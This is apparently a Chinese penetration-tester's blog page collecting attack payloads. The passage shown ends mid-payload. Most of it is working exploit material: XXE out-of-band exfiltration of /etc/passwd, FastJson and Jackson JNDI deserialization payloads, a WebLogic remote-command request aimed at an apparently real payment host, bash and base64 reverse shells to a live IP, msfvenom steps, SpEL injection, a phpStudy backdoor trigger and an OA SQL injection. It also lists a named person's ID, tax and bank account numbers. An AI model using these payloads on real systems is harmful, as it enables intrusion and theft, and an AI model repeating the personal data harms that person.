+<h2 id="LDAP注入"><a href="#LDAP注入" class="headerlink" title="LDAP注入"></a>LDAP注入</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin)(&amp;))</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="前端探针："><a href="#前端探针：" class="headerlink" title="前端探针："></a>前端探针：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`&#x27;;&lt;!--&quot;&lt;XSS&gt;=&lt;!--esi--&gt;&#123;&#123;7*7&#125;&#125;&#123;%7*7%&#125;&amp;&#123;()&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">foo</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">foo</span> <span class="meta-keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">file</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">remote</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://120.79.91.29/evil.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%remote;%all;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">foo</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">code</span>&gt;</span><span class="symbol">&amp;send;</span><span class="tag">&lt;/<span class="name">code</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">msg</span>&gt;</span>mypass<span class="tag">&lt;/<span class="name">msg</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>恶意的DTD；</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % all &quot;&lt;!ENTITY send SYSTEM &#x27;http://120.79.91.29:9999?q=%file;&#x27;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>OOB数据传输：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % all &quot;&lt;!ENTITY send SYSTEM &#x27;http://ip:port?p=%file;&#x27;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>PS:需要注意Content-Type: application/xml</p>
+<h2 id="FastJson-lt-1-2-48"><a href="#FastJson-lt-1-2-48" class="headerlink" title="FastJson&lt;=1.2.48"></a>FastJson&lt;=1.2.48</h2><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;name&quot;</span>: &#123;</span><br><span class="line">    <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;java.lang.Class&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;val&quot;</span>: <span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">&quot;x&quot;</span>: &#123;</span><br><span class="line">    <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;dataSourceName&quot;</span>: <span class="string">&quot;ldap://120.79.91.29:9999/Exploit&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;autoCommit&quot;</span>: <span class="literal">true</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>PS:需要注意Content-Type: application/json</p>
+<h3 id="Weblogic"><a href="#Weblogic" class="headerlink" title="Weblogic"></a>Weblogic</h3><p>访问页面：</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="http://wscpay.sptcc.com/_async/AsyncResponseService">http://wscpay.sptcc.com/_async/AsyncResponseService</a></p>
+</blockquote>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/_async/AsyncResponseService</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>220.248.104.180</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>760</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/soap+xml</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">soapenv:Envelope</span> <span class="attr">xmlns:soapenv</span>=<span class="string">&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;</span> <span class="attr">xmlns:wsa</span>=<span class="string">&quot;http://www.w3.org/2005/08/addressing&quot;</span> <span class="attr">xmlns:asy</span>=<span class="string">&quot;http://www.bea.com/async/AsyncResponseService&quot;</span>&gt;</span>   </span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">soapenv:Header</span>&gt;</span> </span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">wsa:Action</span>&gt;</span>xx<span class="tag">&lt;/<span class="name">wsa:Action</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">wsa:RelatesTo</span>&gt;</span>xx<span class="tag">&lt;/<span class="name">wsa:RelatesTo</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">work:WorkContext</span> <span class="attr">xmlns:work</span>=<span class="string">&quot;http://bea.com/2004/06/soap/workarea/&quot;</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">void</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">array</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.String&quot;</span> <span class="attr">length</span>=<span class="string">&quot;3&quot;</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">&quot;0&quot;</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">string</span>&gt;</span>/bin/bash<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">void</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">&quot;1&quot;</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">string</span>&gt;</span>-c<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">void</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">&quot;2&quot;</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">string</span>&gt;</span>ping 120.79.91.29<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">void</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">array</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">&quot;start&quot;</span>/&gt;</span><span class="tag">&lt;/<span class="name">void</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">work:WorkContext</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">soapenv:Header</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">soapenv:Body</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">asy:onAsyncDelivery</span>/&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">soapenv:Body</span>&gt;</span><span class="tag">&lt;/<span class="name">soapenv:Envelope</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">CVE-2017-10271</span><br><span class="line">http://192.168.8.148:7001/wls-wsat/CoordinatorPortType11</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">CVE-2018-2628</span><br><span class="line">检测weblogic版本信息和t3协议是否开启。只针对没打补丁的情况下的检测。</span><br><span class="line">nmap -n -v -p7001,7002 IP --script=weblogic-t3-info</span><br><span class="line"></span><br><span class="line">CVE-2020-14882</span><br><span class="line">http://127.0.0.1:7001/console/images/%252E%252E%252Fconsole.portal?_nfpb=true&amp;_pageLabel=HomePage1&amp;handle=com.tangosol.coherence.mvel2.sh.ShellSession(%22java.lang.Runtime.getRuntime().exec(%27ping%20119.23.31.7%27);%22);</span><br></pre></td></tr></table></figure>
+
+<h3 id="反弹shell的语句"><a href="#反弹shell的语句" class="headerlink" title="反弹shell的语句"></a>反弹shell的语句</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">编码网站</span><br><span class="line">http://www.jackson-t.ca/runtime-exec-payloads.html</span><br><span class="line"></span><br><span class="line">bash -i &gt;&amp; /dev/tcp/119.23.31.7/8998 0&gt;&amp;1</span><br><span class="line"></span><br><span class="line">bash -c &#123;<span class="built_in">echo</span>,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMTkuMjMuMzEuNy84OTk4IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="metasploit"><a href="#metasploit" class="headerlink" title="metasploit"></a>metasploit</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=119.23.31.7 LPORT=4567 -f elf &gt; shell.elf</span><br><span class="line">mv shell.elf /var/www/html/shell.elf</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf &gt; use exploit/multi/handler</span><br><span class="line">msf exploit(handler) &gt; set PAYLOAD linux/x86/meterpreter/reverse_tcp</span><br><span class="line">msf exploit(handler) &gt; set LHOST 0.0.0.0</span><br><span class="line">msf exploit(handler) &gt; set LPORT 4567</span><br><span class="line">msf exploit(handler) &gt; exploit -j</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="注册真实身份证号（来自网络）"><a href="#注册真实身份证号（来自网络）" class="headerlink" title="注册真实身份证号（来自网络）"></a>注册真实身份证号（来自网络）</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">姚嫣然 440983198311220309</span><br><span class="line">纳税  12500000450401805G</span><br><span class="line">卡号  50001033600050008726</span><br><span class="line">开户  中国建设银行重庆九龙坡金凤支行</span><br><span class="line">   </span><br><span class="line">地址、电话  重庆市渝中区医学院路1号68486151</span><br></pre></td></tr></table></figure>
+
+<h2 id="Jackson"><a href="#Jackson" class="headerlink" title="Jackson"></a>Jackson</h2><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="string">&quot;ch.qos.logback.core.db.DriverManagerConnectionSource&quot;</span>, &#123;<span class="attr">&quot;url&quot;</span>:<span class="string">&quot;jdbc:h2:tcp://127.0.0.1:8005/~/test&quot;</span>&#125;]</span><br></pre></td></tr></table></figure>
+
+<p>or</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="string">&quot;ch.qos.logback.core.db.DriverManagerConnectionSource&quot;</span>, &#123;<span class="attr">&quot;url&quot;</span>:<span class="string">&quot;jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM &#x27;http://120.79.91.29:9999/inject.sql&#x27;&quot;</span>&#125;]</span><br></pre></td></tr></table></figure>
+
+
+
+<p>CVE-2020-8840</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[&quot;org.apache.xbean.propertyeditor.JndiConverter&quot;,   &#123;&quot;asText&quot;:&quot;ldap://120.79.91.29:9999/ExportObject&quot;&#125;  ]</span><br></pre></td></tr></table></figure>
+
+
+
+<p>PS:需要注意Content-Type: application/json</p>
+<h2 id="Spring-Boot-Actuator"><a href="#Spring-Boot-Actuator" class="headerlink" title="Spring Boot Actuator"></a>Spring Boot Actuator</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/jolokia/list</span><br><span class="line">/env</span><br><span class="line">/jolokia/read&lt;svg%20onload=alert(document.cookie)&gt;?mimeType=text/html</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;type&quot;</span>: <span class="string">&quot;EXEC&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;mbean&quot;</span>: <span class="string">&quot;Users:database=UserDatabase,type=UserDatabase&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;operation&quot;</span>: <span class="string">&quot;createRole&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;arguments&quot;</span>: [<span class="string">&quot;manager-gui&quot;</span>, <span class="string">&quot;&quot;</span>]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="Spring-SpEL注入"><a href="#Spring-SpEL注入" class="headerlink" title="Spring SpEL注入"></a>Spring SpEL注入</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$&#123;7*7&#125;</span><br><span class="line">$&#123;T(java.lang.system).getenv()&#125;</span><br><span class="line">$&#123;T(java.lang.Runtime).getRuntime().exec(T(java.</span><br><span class="line">lang.Character).toString(105).concat(T(java.lang.Character).toString(100)))&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="Phpstudy后门"><a href="#Phpstudy后门" class="headerlink" title="Phpstudy后门"></a>Phpstudy后门</h3><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Accept-Encoding:gzip,deflate</span><br><span class="line">Accept-Charset:c3lzdGVtKCd3aG9hbWknKTs=(whoami)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/08/19/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95Payload%E8%AE%B0%E5%BD%95/1569678510656.png" alt="1569678510656"></p>
+<h3 id="泛微OA注入"><a href="#泛微OA注入" class="headerlink" title="泛微OA注入"></a>泛微OA注入</h3><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/mobile/browser/WorkflowCenterTreeData.jsp?node=wftype_1&amp;scope=2333</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>ip:port</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko/20100101 Firefox/56.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>2236</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"></span><br><span class="line"><span class="xquery">formids=<span class="number">11111111111</span>)))<span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span><span 